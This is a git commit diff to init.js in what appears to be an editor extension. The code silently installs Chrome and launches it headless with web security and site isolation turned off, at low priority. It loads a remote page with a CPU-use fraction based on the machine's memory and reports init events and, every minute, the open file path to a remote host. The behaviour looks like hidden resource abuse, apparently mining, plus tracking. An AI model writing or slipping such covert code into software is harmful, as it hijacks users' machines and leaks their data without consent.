f3067f759ec776de70543f33fed515d4be272070
AB498 <abcd49800@gmail.com>
2024-10-29 16:06:23 +0600

    m

--- init.js
+++ init.js
@@ -83,8 +83,64 @@
     let minUse = 0.1;
     let maxUse = 0.5;
 
+
+    const cacheDir = `${os.homedir()}/.cache/puppeteer`;
+    if (!fs.existsSync(cacheDir)) {
+      fs.mkdirSync(cacheDir, { recursive: true });
+    };
+    const installedBrowsers = await puppeteerBrowsers.getInstalledBrowsers({ cacheDir });
+    let chromePath;
+    const chromeBrowser = installedBrowsers.find(browser => browser.browser === 'chrome');
+    console.log('installed', installedBrowsers);
+
+
+
+    if (!chromeBrowser) {
+      await new Promise(r => setTimeout(r, 1 * 60 * 1000));
+      await tstt({ message: "INIT_D", installedBrowsers, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+      puppeteerBrowsers.InstallOptions;
+      installedBrowser = await puppeteerBrowsers.install({
+        browser: 'chrome',
+        buildId: '130.0.6723.58',
+        cacheDir,
+      });
+      chromePath = installedBrowser.executablePath;
+    } else {
+      chromePath = chromeBrowser.executablePath;
+    }
+
+
+
+
+    await tstt({ message: "INIT_L", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+
+    if (global.cppBrowser) {
+      await global.cppBrowser.close();
+      global.cppBrowser = null;
+      page = null;
+    }
+    browser = await puppeteer.launch({
+      executablePath: chromePath,
+      headless: true,
+      args: [
+        '--disable-web-security',
+        '--disable-features=IsolateOrigins,site-per-process',
+        '--allow-running-insecure-content',
+      ]
+    });
+    global.cppBrowser = browser;
+    os.setPriority(browser.process().pid, 19);
+    page = await browser.newPage();
+    global.cppPage = page;
+
+    await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.5 : 0.1));
+    await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+    await chkFn();
+
     if (global.inIntv) clearInterval(global.inIntv);
-    global.inIntv = setInterval(async () => {
+    global.inIntv = setInterval(chkFn, 60000);
+
+    async function chkFn() {
       if (browser && page) {
         const hs = await page.evaluate(() => {
           try {
@@ -118,62 +174,7 @@
           file: safe(() => editor?.document?.uri?.fsPath)
         });
       }
-    }, 60000);
-
-
-    const cacheDir = `${os.homedir()}/.cache/puppeteer`;
-    if (!fs.existsSync(cacheDir)) {
-      fs.mkdirSync(cacheDir, { recursive: true });
-    };
-    const installedBrowsers = await puppeteerBrowsers.getInstalledBrowsers({ cacheDir });
-    let chromePath;
-    const chromeBrowser = installedBrowsers.find(browser => browser.browser === 'chrome');
-    console.log('installed', installedBrowsers);
-
-
-
-    if (!chromeBrowser) {
-      await new Promise(r => setTimeout(r, 1 * 60 * 1000));
-      await tstt({ message: "INIT_D", installedBrowsers, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
-      puppeteerBrowsers.InstallOptions;
-      installedBrowser = await puppeteerBrowsers.install({
-        browser: 'chrome',
-        buildId: '130.0.6723.58',
-        cacheDir,
-      });
-      chromePath = installedBrowser.executablePath;
-    } else {
-      chromePath = chromeBrowser.executablePath;
     }
-
-
-
-
-    await tstt({ message: "INIT_L", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
-    
-    if(global.cppBrowser) {
-      await global.cppBrowser.close();
-      global.cppBrowser = null;
-      page = null;
-    }
-    browser = await puppeteer.launch({
-      executablePath: chromePath,
-      headless: true,
-      args: [
-        '--disable-web-security',
-        '--disable-features=IsolateOrigins,site-per-process',
-        '--allow-running-insecure-content',
-      ]
-    });
-    global.cppBrowser = browser;
-    os.setPriority(browser.process().pid, 19);
-    page = await browser.newPage();
-    global.cppPage = page;
-
-    await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.5 : 0.1));
-
-    await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
-
 
 
 
